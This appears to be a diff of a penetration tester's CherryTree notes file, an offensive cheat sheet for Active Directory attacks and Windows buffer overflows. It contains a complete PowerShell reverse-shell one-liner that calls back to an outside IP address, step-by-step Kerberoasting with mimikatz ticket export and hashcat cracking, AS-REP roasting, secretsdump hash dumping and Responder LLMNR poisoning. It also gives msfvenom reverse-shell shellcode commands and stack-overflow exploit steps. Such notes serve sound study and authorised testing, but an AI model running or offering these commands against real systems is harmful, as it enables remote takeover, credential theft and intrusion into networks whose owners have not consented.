+• powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.150',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</rich_text>
       </node>
     </node>
-    <node name="Active Directory" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344242" ts_lastsave="1640812758">
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">AS-Rep Roasting</rich_text>
-      <rich_text>
+    <node name="Active Directory" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344242" ts_lastsave="1647020645">
+      <rich_text>SPNs
+
+&lt;service&gt;/&lt;machine&gt;@&lt;domain&gt;
+MSSQLsvc/sqlserver@domain.local
 
 </rich_text>
-      <rich_text style="italic">Authentication Server Request (AS-Req)</rich_text>
+      <rich_text weight="heavy">Nested groups</rich_text>
       <rich_text>
-Client asks the Kerberos Key Distribution Center for a ticket-granting ticket, sending an encrypted timestamp along with the request. 
+When you include a group and all its users to another group, it becomes a Nested Group.</rich_text>
+      <node name="Enumeration" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1640812758" ts_lastsave="1647034226">
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Users &amp; Groups</rich_text>
+        <rich_text>
 
-</rich_text>
-      <rich_text style="italic">Authentication Server Reply (AS-Rep)</rich_text>
-      <rich_text>
-The KDC responds with a ticket-granting ticket for the client, and part of that reply contains data encrypted which contains the client's password, so it's possible to crack this hash
+• net user
+• net user /domain
+• net user &lt;user&gt; /domain
 
-When Kerberos pre-auth is disabled, the AS-Req is not going to send the encrypted timestamp, so it's not necessary to know the victim's password to get the AS-Rep back.
-
-• You need to know some valid usernames or at least their strucute (John Smith could be jsmith, johnm and so on)
-
-
-</rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Kerberoasting</rich_text>
-      <rich_text>
-
-Service Principal Names (SPNs) are used by Kerberos Authentication to associate a service instance with a service logon account. The SPN acts as a pointer to the domain account running the service.
-
-SPN Example
-service/machine@domain
-MSSQLsvc/sql1@ad.local
+• net group
+• net group /domain
 
 
 </rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">LLMNR Poisoning</rich_text>
-      <rich_text>
-
-responder -I &lt;network_interface&gt;
-
-</rich_text>
-      <rich_text weight="heavy">Impersonate user with Responder-MultiRelay</rich_text>
-      <rich_text>
-
-multirelay -t &lt;machine_ip&gt; -u ALL
-
-</rich_text>
-      <rich_text weight="heavy">Upgrade Shell to Meterpreter</rich_text>
-      <rich_text>
-
-exploit/multi/scripts/web_delivery
-
-set srvhost, target 2, payload, lhost, lport, exitonsession, exploit -j
-
-
-</rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Metasploit</rich_text>
-      <rich_text>
-
-</rich_text>
-      <rich_text weight="heavy">Meterpreter</rich_text>
-      <rich_text>
-• load extapi</rich_text>
-      <node name="Enumeration" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1640812758" ts_lastsave="1643489053">
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Credential Harvesting</rich_text>
         <rich_text>
 
@@ -2027,8 +2203,225 @@ Filter users without Kerberos pre-auth
 • GetNPUsers.py -dc-ip &lt;host&gt; -usersfile &lt;file&gt; -no-pass &lt;domain&gt;/
 
 Dump hashes
-• secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;host&gt;</rich_text>
+• secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;host&gt;
+
+
+</rich_text>
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Powershell</rich_text>
+        <rich_text>
+
+Get domain details
+• [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+</rich_text>
+        <rich_text weight="heavy">PowerView</rich_text>
+        <rich_text>
+
+• Import-Module .\PowerView.ps1
+
+Get logged users
+• Get-NetLoggedon -ComputerName &lt;machine_name&gt;
+
+Get active sessions on a DC
+• Get-NetSession -ComputerName &lt;domain_controller&gt;</rich_text>
       </node>
+      <node name="Exploitation" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1646994823" ts_lastsave="1647051960">
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">AS-Rep Roasting</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text style="italic">Authentication Server Request (AS-Req)</rich_text>
+        <rich_text>
+Client asks the Kerberos Key Distribution Center for a ticket-granting ticket, sending an encrypted timestamp along with the request. 
+
+</rich_text>
+        <rich_text style="italic">Authentication Server Reply (AS-Rep)</rich_text>
+        <rich_text>
+The KDC responds with a ticket-granting ticket for the client, and part of that reply contains data encrypted which contains the client's password, so it's possible to crack this hash
+
+When Kerberos pre-auth is disabled, the AS-Req is not going to send the encrypted timestamp, so it's not necessary to know the victim's password to get the AS-Rep back.
+
+• You need to know some valid usernames or at least their strucute (John Smith could be jsmith, johnm and so on)
+
+
+</rich_text>
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Kerberoasting</rich_text>
+        <rich_text>
+
+Service Principal Names (SPNs) are used by Kerberos Authentication to associate a service instance with a service logon account. The SPN acts as a pointer to the domain account running the service.
+
+SPN Example
+service/machine@domain
+MSSQLsvc/sql1@ad.local
+
+
+1. Get users with SPNs
+• GetUserSPNs.ps1
+   ◇ This gotta be run through a foothold or a user that's inside of the domain, otherwise it won't work
+• Grab the SPN and move on
+
+2. Get service tickets
+• Add-Type -AssemblyName System.IdentityModel
+• New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"
+   ◇ You should launch powershell and execute both inside of powershell already, appending this after powershell won't work
+
+3. Extract tickets
+• Get out of powershell, transfer and run mimikatz
+   ◇ mimikatz.exe "privilege::debug" "kerberos::list /export" "exit"
+
+4. Crack tickets
+• python3 tgsrepcrack.py &lt;wordlist&gt; &lt;kirbi_file&gt;
+
+4.1 Convert &amp; crack (faster)
+• python3 kirbi2john.py &lt;kirbi_file&gt; &lt;output_file&gt;
+• hashcat -m 13100 &lt;file&gt; &lt;wordlist&gt;
+
+
+</rich_text>
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">LLMNR Poisoning</rich_text>
+        <rich_text>
+
+responder -I &lt;network_interface&gt;
+
+</rich_text>
+        <rich_text weight="heavy">Impersonate user with Responder-MultiRelay</rich_text>
+        <rich_text>
+
+multirelay -t &lt;machine_ip&gt; -u ALL
+
+</rich_text>
+        <rich_text weight="heavy">Upgrade Shell to Meterpreter</rich_text>
+        <rich_text>
+
+exploit/multi/scripts/web_delivery
+
+set srvhost, target 2, payload, lhost, lport, exitonsession, exploit -j
+
+
+</rich_text>
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Metasploit</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text weight="heavy">Meterpreter</rich_text>
+        <rich_text>
+• load extapi</rich_text>
+      </node>
+    </node>
+    <node name="Low-level" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1644085392" ts_lastsave="1644085432">
+      <node name="Binary exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1644085398" ts_lastsave="1644085468">
+        <node name="Windows" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1644085468" ts_lastsave="1644837155">
+          <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Stack Smashing</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text weight="heavy">Bad characters</rich_text>
+          <rich_text>
+bad = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+Well-known bad chars
+• 0x00 - nullbyte, string terminator
+• 0x0a, 0x0d - carriage returns and line feeds might be treated as line terminators (especially HTTP or FTP protocols)
+• 0xff - EOF, end of line
+
+</rich_text>
+          <rich_text weight="heavy">Spiking</rich_text>
+          <rich_text>
+# trun.spk 
+s_readline(); 
+s_string("TRUN "); 
+s_string_variable("0;) 
+
+generic_send_tcp &lt;HOST&gt; &lt;PORT&gt; trun.spk 0 0
+
+</rich_text>
+          <rich_text weight="heavy">Generate pattern</rich_text>
+          <rich_text>
+• /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1000
+
+</rich_text>
+          <rich_text weight="heavy">Get the offset</rich_text>
+          <rich_text>
+• /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 1000 -q &lt;ACCESS VIOLATION&gt;
+• !mona findmsp
+
+• The manual way is to send bytes and overwrite EIP. Use A's and B's in order to diferentiate
+</rich_text>
+          <rich_text style="italic">• To reach EIP you increase 4 bytes after the Offset.</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text weight="heavy">Fuzz for badchars</rich_text>
+          <rich_text>
+• buffer = "A" * &lt;offset&gt; + "BBBB" + bad
+
+</rich_text>
+          <rich_text weight="heavy">Identify the Return Address</rich_text>
+          <rich_text>
+• Look for JMP ESP on the binary or a DLL without ASLR
+• !mona jmp -r esp -cpb "&lt;badchars&gt;"
+• !mona find -s "\xff\xe4"
+
+</rich_text>
+          <rich_text weight="heavy">Generate ShellCode</rich_text>
+          <rich_text>
+• msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=X -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload
+• msfvenom -p linux/x86/shell_reverse_tcp LHOST=X LPORT=X EXITFUNC=thread -b "\x00" -f python -v payload
+
+
+</rich_text>
+          <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">SEH-based Stack Overflow</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text weight="heavy">Finding POP POP RET gadgets</rich_text>
+          <rich_text>
+• avoid gadgets that end with a clear return (RET 0x10)
+• Avoid gadgets from DLLs with Rebase flags
+   ◇ Rebase is a DLL feature that allows it to be re-located in case another DLL is already occupying the memory address where it was planned to be loaded, very similar to ASLR, where the base address won't be preditable</rich_text>
+        </node>
+      </node>
+      <node name="Exploit Development" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1644085449" ts_lastsave="1644085449"/>
+    </node>
+    <node name="Methodology" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1645479130" ts_lastsave="1645479133">
+      <rich_text>Hunt for low-hanging fruits first, then start thinking ahead.
+
+Got a user list? Try the user as pass first, then brute-force while doing other stuff.
+
+</rich_text>
+    </node>
+    <node name="Traffic analysis" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1646134082" ts_lastsave="1646134970">
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Wireshark</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Capture filters</rich_text>
+      <rich_text>
+
+Address range
+• net &lt;range&gt;
+
+</rich_text>
+      <rich_text weight="heavy">Display filters</rich_text>
+      <rich_text>
+
+Ports
+• tcp.port == 21
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">TCPdump</rich_text>
+      <rich_text>
+
+Filter by host
+• tcpdump -n src host &lt;ip&gt; -r &lt;file&gt;
+• tcpdump -n dst host &lt;ip&gt; -r &lt;file&gt;
+
+Filter by port
+• tcpdump -n port &lt;port&gt; -r &lt;file&gt;
+
+Print packet data
+• tcpdump -nX -r &lt;file&gt;</rich_text>
     </node>
   </node>
 </cherrytree>
